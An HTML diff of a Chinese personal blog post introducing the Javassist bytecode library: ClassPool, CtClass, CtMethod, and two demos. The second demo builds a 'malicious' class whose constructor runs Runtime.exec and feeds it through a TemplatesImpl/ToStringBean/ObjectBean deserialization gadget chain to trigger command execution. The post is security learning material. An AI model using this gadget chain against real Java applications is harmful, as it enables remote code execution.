@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/luo.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/luo.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"luokuang1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前置知识介绍Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，或者直接创建一个新的类，这个过程就类似java的反射调用，但是Javassist一般用于对于字节码文件的修改 基础知识介绍Clas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="javassist基础知识学习">
+<meta property="og:url" content="https://luokuang1.github.io/2025/02/09/javassist%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="luokuang的博客">
+<meta property="og:description" content="前置知识介绍Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，或者直接创建一个新的类，这个过程就类似java的反射调用，但是Javassist一般用于对于字节码文件的修改 基础知识介绍Clas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg0Y2UzYmQyYzdmYmIyMWM1YTlmOWE2OTU0Nzc5YmFfYXhZc2Y2MGs1WmF4Q0M3V0FtbERrTkhOWmhDQkgyOWpfVG9rZW46SnZwMWIxWENabzRzNWN4eWh2UmMwSWhqbjhlXzE3Mzk1MjIxNjU6MTczOTUyNTc2NV9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=OWJhMjIzNjAyZTYyNTNjZWY3ZjkwZDNkYWU4M2JmNDRfQmR6VzJnVHgwMlFHZjJlWmpRVkhJWkV1S3U2eTRNRnJfVG9rZW46U3Jub2J5bEV0bzhyeEF4ZnZtMGN1QlZZbjFiXzE3Mzk1MjIxNjU6MTczOTUyNTc2NV9WNA">
+<meta property="article:published_time" content="2025-02-09T08:35:36.000Z">
+<meta property="article:modified_time" content="2025-02-14T08:39:08.227Z">
+<meta property="article:author" content="luokuang">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg0Y2UzYmQyYzdmYmIyMWM1YTlmOWE2OTU0Nzc5YmFfYXhZc2Y2MGs1WmF4Q0M3V0FtbERrTkhOWmhDQkgyOWpfVG9rZW46SnZwMWIxWENabzRzNWN4eWh2UmMwSWhqbjhlXzE3Mzk1MjIxNjU6MTczOTUyNTc2NV9WNA">
+
+
+<link rel="canonical" href="https://luokuang1.github.io/2025/02/09/javassist%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://luokuang1.github.io/2025/02/09/javassist%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/","path":"2025/02/09/javassist基础知识学习/","title":"javassist基础知识学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>javassist基础知识学习 | luokuang的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="luokuang的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">luokuang的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">前置知识介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.</span> <span class="nav-text">基础知识介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ClassPool"><span class="nav-number">2.1.</span> <span class="nav-text">ClassPool</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CtClass%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%94%A8%E6%B3%95"><span class="nav-number">2.2.</span> <span class="nav-text">CtClass及相关用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CtMethod"><span class="nav-number">2.3.</span> <span class="nav-text">CtMethod</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo1"><span class="nav-number">2.4.</span> <span class="nav-text">demo1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo2"><span class="nav-number">2.5.</span> <span class="nav-text">demo2</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="luokuang"
+      src="/images/luo.jpg">
+  <p class="site-author-name" itemprop="name">luokuang</p>
+  <div class="site-description" itemprop="description">沉淀，还得继续沉淀</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://luokuang1.github.io/2025/02/09/javassist%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/luo.jpg">
+      <meta itemprop="name" content="luokuang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="luokuang的博客">
+      <meta itemprop="description" content="沉淀，还得继续沉淀">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="javassist基础知识学习 | luokuang的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          javassist基础知识学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-02-09 16:35:36" itemprop="dateCreated datePublished" datetime="2025-02-09T16:35:36+08:00">2025-02-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-14 16:39:08" itemprop="dateModified" datetime="2025-02-14T16:39:08+08:00">2025-02-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="前置知识介绍"><a href="#前置知识介绍" class="headerlink" title="前置知识介绍"></a>前置知识介绍</h3><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，或者直接创建一个新的类，这个过程就类似java的反射调用，但是Javassist一般用于对于字节码文件的修改</p>
+<h3 id="基础知识介绍"><a href="#基础知识介绍" class="headerlink" title="基础知识介绍"></a>基础知识介绍</h3><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>ClassPool为CtClass对象的容器。要创建一个CtClass对象必须通过ClassPool来获取，创建ClassPool的方法如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool=ClassPool.getDefault();</span><br></pre></td></tr></table></figure>
+<p>对于CtClass的获取，可以直接通过makeClass来创建一个新的类赋值，还可以通过get方法来进行获取，但是在一些特殊情况将无法获取到类，由于ClassPool.getDfault()获取的ClassPool使用JVM的类搜索的路径，如果程序运行在JBoss或者Tomcat等web服务器上就可能找不到自己定义的类，这里就需要手动输入路径来进行获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pool.getDefault().insertClassPath(<span class="string">&quot;/path/to/your/classes&quot;</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test.class));</span><br></pre></td></tr></table></figure>
+<h4 id="CtClass及相关用法"><a href="#CtClass及相关用法" class="headerlink" title="CtClass及相关用法"></a>CtClass及相关用法</h4><p>CtClass可以看做一个加强版的class对象，但是CtClass需要以ClassPool为容器来获取</p>
+<p>通常的获取方式为ClassPool.get(ClassName)，这里就得先创建一个ClassPool容器。CtClass是核心，对于创建属性，方法或者构造器都是基于CtClass来进行的</p>
+<p>一般获取用法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;test&quot;</span>)<span class="comment">//在默认包下进行创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;java.test&quot;</span>)<span class="comment">//表示创建在指定包下</span></span><br><span class="line">pool.get(<span class="string">&quot;test&quot;</span>)<span class="comment">//获取一个已存在的类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//指定父类创建</span></span><br><span class="line">pool.makeClass(<span class="string">&quot;test&quot;</span>,pool.get(person.class.getName()))<span class="comment">//表示test继承父类person</span></span><br><span class="line"><span class="type">Ctclass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(person.class.getName());</span><br><span class="line">ctClass.setSuperclass(superClass);<span class="comment">//和上面一样</span></span><br></pre></td></tr></table></figure>
+<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>CtMethod同理可以看做一个加强版的Method，这里可以通过CtClass.getDeclaredMethod(MethodName)方法来获取，或者直接通过new CtMethod(type,name,new CtClass[]{},ctclass)来创建一个CtMethod对象，它里面还支持对类中方法进行修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
+<p>符号含义$0,$1, $2, …$0 = this; $1 = args[1] …..$args方法参数数组.它的类型为 Object[]<script type="math/tex">所有实参。例如, m(</script>) 等价于 m(1,2,…)$cflow(…)cflow 变量$r返回结果的类型，用于强制类型转换$w包装器类型，用于强制类型转换$_返回值$sig类型为 java.lang.Class 的参数类型数组$type一个 java.lang.Class 对象，表示返回值类型$class一个 java.lang.Class 对象，表示当前正在修改的类</p>
+<h4 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h4><p>依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.25</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>下面一个小demo创建</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ublic <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">aaa</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//创建一个CtClass容器ClassPool</span></span><br><span class="line">    ClassPool pool=ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Object.class));</span><br><span class="line">    <span class="comment">//在该包下创建一个person类</span></span><br><span class="line">    CtClass ctclass=pool.makeClass(<span class="string">&quot;person&quot;</span>);</span><br><span class="line">    <span class="comment">//设置属性</span></span><br><span class="line">    CtField ctfield=<span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>),<span class="string">&quot;name&quot;</span>,ctclass);</span><br><span class="line">    ctfield.setModifiers(Modifier.PRIVATE);</span><br><span class="line">    <span class="comment">//定义初始值</span></span><br><span class="line">    ctclass.addField(ctfield,CtField.Initializer.constant(<span class="string">&quot;luokuang&quot;</span>));</span><br><span class="line">    <span class="comment">//创建一个有参构造方法</span></span><br><span class="line">    CtConstructor ctconstructor=<span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;,ctclass);</span><br><span class="line">    ctconstructor.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    <span class="comment">//$1表示第一个参数，这里进行构造方法体的创建</span></span><br><span class="line">    ctconstructor.setBody(<span class="string">&quot;&#123; this.name=$1; &#125;&quot;</span>);</span><br><span class="line">    ctclass.addConstructor(ctconstructor);</span><br><span class="line">    <span class="comment">//创建一个方法</span></span><br><span class="line">    CtMethod ctMethod=<span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;print&quot;</span>,<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctclass);</span><br><span class="line">    ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    ctMethod.setBody(<span class="string">&quot;&#123; System.out.println(this.name);&#125;&quot;</span>);</span><br><span class="line">    ctclass.addMethod(ctMethod);</span><br><span class="line">    <span class="comment">//将类创建为一个class字节码文件</span></span><br><span class="line">    ctclass.writeFile(<span class="string">&quot;D:\\javadm\\javassist\\src\\main\\java&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    aaa();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建的字节码文件</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzg0Y2UzYmQyYzdmYmIyMWM1YTlmOWE2OTU0Nzc5YmFfYXhZc2Y2MGs1WmF4Q0M3V0FtbERrTkhOWmhDQkgyOWpfVG9rZW46SnZwMWIxWENabzRzNWN4eWh2UmMwSWhqbjhlXzE3Mzk1MjIxNjU6MTczOTUyNTc2NV9WNA" alt="img"></p>
+<h4 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h4><p>创建一个简单的恶意字节码文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setter</span><span class="params">(String cmd)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ClassPool pool=ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">    CtClass cc=pool.makeClass(<span class="string">&quot;rce&quot;</span>);</span><br><span class="line">    cc.setSuperclass(superClass);</span><br><span class="line">    String statics=<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;); &#125;&quot;</span>;</span><br><span class="line">    CtConstructor ctConstructor=<span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,cc);</span><br><span class="line">    ctConstructor.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line">    cc.addConstructor(ctConstructor);</span><br><span class="line">    cc.writeFile(<span class="string">&quot;D:\\javadm\\javassist\\src\\main\\java&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建的恶意字节码文件</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=OWJhMjIzNjAyZTYyNTNjZWY3ZjkwZDNkYWU4M2JmNDRfQmR6VzJnVHgwMlFHZjJlWmpRVkhJWkV1S3U2eTRNRnJfVG9rZW46U3Jub2J5bEV0bzhyeEF4ZnZtMGN1QlZZbjFiXzE3Mzk1MjIxNjU6MTczOTUyNTc2NV9WNA" alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/rce.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.hashCode();</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(equalsBean,<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field aa=toStringBean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        aa.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aa.set(toStringBean,templates);</span><br><span class="line">        serialized(hashtable,<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line">        unserialized(<span class="string">&quot;123.bin&quot;</span>);</span><br><span class="line"><span class="comment">//        setter(&quot;calc&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/08/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="FastJson反序列化">
+                  <i class="fa fa-angle-left"></i> FastJson反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/02/14/%E6%9C%80%E8%BF%91%E7%9A%84%E6%84%9F%E6%85%A8/" rel="next" title="最近的感慨">
+                  最近的感慨 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">luokuang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
